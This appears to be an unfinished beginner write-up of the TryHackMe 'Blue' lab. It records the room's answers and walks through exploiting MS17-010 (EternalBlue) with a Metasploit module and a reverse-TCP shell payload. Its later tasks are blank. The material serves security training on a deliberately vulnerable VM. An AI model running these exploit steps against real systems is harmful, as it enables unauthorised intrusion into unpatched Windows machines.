# [Blue](https://tryhackme.com/room/blue)

![Blue](./images/Blue.png)

## Task 1 - Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. 

![task1-blue](./images/task1-blue.png)

Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) - [Blue Merch](https://www.redbubble.com/shop/ap/53637482) - [Twitter](https://twitter.com/Vargnaar)

Link to Ice, the sequel to Blue: [Link](https://tryhackme.com/room/ice)

You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)

-----------------------------------------


The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html


Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

### Answer the questions

* Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

	![task1-nmap](./images/task1-nmap.png)

* How many ports are open with a port number under 1000?

	`3`

* What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

	`ms17-010`

## Task 2 - Gain Access

Exploit the machine and gain a foothold.

### Answer the questions

* Start [Metasploit](https://tryhackme.com/module/metasploit)

	![task2-msfconsole](./images/task2-msfconsole.png)

* Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

	`exploit/windows/smb/ms17_010_eternalblue`

	![task2-ms17](./images/task2-ms17.png)

* Show options and set the one required value. What is the name of this value? (All caps for submission)

	`RHOSTS`

	![task2-options](./images/task2-options.png)

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

* With that done, run the exploit!

* Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

## Task 3 - Escalate



## Task 4 - Cracking



## Task 5 - Find flags!